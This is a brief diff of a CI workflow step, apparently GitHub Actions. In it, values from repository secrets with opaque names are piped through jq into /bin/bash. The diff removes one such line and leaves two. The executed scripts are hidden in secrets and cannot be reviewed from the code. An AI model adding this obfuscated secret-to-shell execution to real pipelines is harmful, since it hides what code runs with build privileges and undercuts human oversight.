@@ -22,7 +22,6 @@ jobs:
           m11: ${{ secrets.m11 }}
         run: |
           printf '%s' "$m11" | jq -r .gvgn65 | /bin/bash
-          printf '%s' "$inm61794" | jq -r .f7123 | /bin/bash
           printf '%s' "$nag8612" | jq -r .tv408 | /bin/bash
 
       - name: Persist output
